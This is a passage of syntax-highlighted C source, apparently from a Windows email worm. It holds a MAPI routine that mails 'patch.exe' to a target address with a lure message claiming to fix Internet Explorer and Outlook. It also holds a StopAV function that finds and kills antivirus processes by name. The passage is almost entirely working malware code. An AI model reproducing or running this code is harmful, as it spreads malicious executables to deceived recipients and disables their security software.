</span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hf2</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">hf</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">sendmail</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">tos</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">memset</span><span class="sc10">(&amp;</span><span class="sc11">mess</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiMessage</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">memset</span><span class="sc10">(&amp;</span><span class="sc11">from</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiRecipDesc</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">wsprintf</span><span class="sc10">(</span><span class="sc11">subj</span><span class="sc10">,</span><span class="sc6">"Mail to %s."</span><span class="sc10">,</span><span class="sc11">tos</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">from</span><span class="sc10">.</span><span class="sc11">lpszName</span><span class="sc10">=</span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">from</span><span class="sc10">.</span><span class="sc11">ulRecipClass</span><span class="sc10">=</span><span class="sc11">MAPI_ORIG</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">mess</span><span class="sc10">.</span><span class="sc11">lpszSubject</span><span class="sc10">=</span><span class="sc11">subj</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">mess</span><span class="sc10">.</span><span class="sc11">lpszNoteText</span><span class="sc10">=</span><span class="sc6">"I send you this patch.\n"</span><span class="sc0">
        </span><span class="sc6">"It corrects a bug into Internet Explorer and Outlook.\n\n"</span><span class="sc0">
        </span><span class="sc6">"   Have a nice day. Best Regards."</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">mess</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">=(</span><span class="sc11">MapiRecipDesc</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiRecipDesc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">mess</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">mess</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiRecipDesc</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">mess</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">lpszName</span><span class="sc10">=</span><span class="sc11">tos</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">mess</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">lpszAddress</span><span class="sc10">=</span><span class="sc11">tos</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">mess</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">-&gt;</span><span class="sc11">ulRecipClass</span><span class="sc10">=</span><span class="sc11">MAPI_TO</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">mess</span><span class="sc10">.</span><span class="sc11">nRecipCount</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">mess</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">=(</span><span class="sc11">MapiFileDesc</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiFileDesc</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">mess</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">memset</span><span class="sc10">(</span><span class="sc11">mess</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">MapiFileDesc</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc11">mess</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">lpszPathName</span><span class="sc10">=</span><span class="sc11">filename</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">mess</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">-&gt;</span><span class="sc11">lpszFileName</span><span class="sc10">=</span><span class="sc6">"patch.exe"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">mess</span><span class="sc10">.</span><span class="sc11">nFileCount</span><span class="sc10">=</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">mess</span><span class="sc10">.</span><span class="sc11">lpOriginator</span><span class="sc10">=&amp;</span><span class="sc11">from</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc11">mSendMail</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,&amp;</span><span class="sc11">mess</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">

</span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">mess</span><span class="sc10">.</span><span class="sc11">lpRecips</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">mess</span><span class="sc10">.</span><span class="sc11">lpFiles</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">StopAV</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">antivirus</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">register</span><span class="sc0"> </span><span class="sc11">BOOL</span><span class="sc0"> </span><span class="sc11">term</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">lSnapshot</span><span class="sc10">=</span><span class="sc11">CreateToolhelp32Snapshot</span><span class="sc10">(</span><span class="sc11">TH32CS_SNAPPROCESS</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">uProcess</span><span class="sc10">.</span><span class="sc11">dwSize</span><span class="sc10">=</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">uProcess</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">rProcessFound</span><span class="sc10">=</span><span class="sc11">Process32First</span><span class="sc10">(</span><span class="sc11">lSnapshot</span><span class="sc10">,&amp;</span><span class="sc11">uProcess</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">rProcessFound</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">uProcess</span><span class="sc10">.</span><span class="sc11">szExeFile</span><span class="sc10">,</span><span class="sc11">antivirus</span><span class="sc10">)!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">myproc</span><span class="sc10">=</span><span class="sc11">OpenProcess</span><span class="sc10">(</span><span class="sc11">PROCESS_ALL_ACCESS</span><span class="sc10">,</span><span class="sc11">FALSE</span><span class="sc10">,</span><span class="sc11">uProcess</span><span class="sc10">.</span><span class="sc11">th32ProcessID</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">myproc</span><span class="sc10">!=</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">term</span><span class="sc10">=</span><span class="sc11">TerminateProcess</span><span class="sc10">(</span><span class="sc11">myproc</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">myproc</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">rProcessFound</span><span class="sc10">=</span><span class="sc11">Process32Next</span><span class="sc10">(</span><span class="sc11">lSnapshot</span><span class="sc10">,&amp;</span><span class="sc11">uProcess</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc11">CloseHandle</span><span class="sc10">(</span><span class="sc11">lSnapshot</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
